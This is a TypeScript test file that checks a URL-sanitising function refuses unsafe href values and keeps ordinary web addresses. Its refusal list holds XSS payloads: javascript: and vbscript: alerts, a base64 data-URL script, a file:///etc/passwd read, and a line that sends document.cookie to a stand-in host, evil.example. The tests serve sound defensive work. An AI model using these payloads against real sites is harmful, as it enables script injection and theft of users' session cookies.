// Copyright Nexthop Systems Inc.
// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it } from "vitest";

import { linkable } from "./addressable";

// A string that becomes an `href` is a scheme the browser acts on, so what is
// pinned here is the refusal: the corpus that gets script past a renderer, and
// the ordinary addresses that must still be links.
describe("linkable", () => {
  it("refuses a scheme the browser would act on", () => {
    for (const written of [
      "javascript:alert(1)",
      "JaVaScRiPt:alert(1)",
      "  javascript:alert(1)",
      "\tjavascript:alert(1)",
      "vbscript:msgbox(1)",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "file:///etc/passwd",
      "//evil.example/log",
      "/\\evil.example/log",
      "mailto:security@example.com",
      // The scheme named anywhere but at the front. An unanchored test reads
      // this as an address because it contains one.
      "javascript:fetch('https://evil.example?c='+document.cookie)",
    ]) {
      expect(linkable(written), written).toBeNull();
    }
  });

  it("keeps the addresses people actually write", () => {
    for (const written of [
      "https://jira.example.com/browse/SEC-1",
      "http://build.example/job/42",
      "HTTPS://EXAMPLE.COM/x",
      "  https://example.com/x  ",
    ]) {
      expect(linkable(written), written).toBe(written.trim());
    }
  });

  it("answers nothing for nothing", () => {
    expect(linkable(undefined)).toBeNull();
    expect(linkable(null)).toBeNull();
    expect(linkable("")).toBeNull();
    expect(linkable("   ")).toBeNull();
  });
});
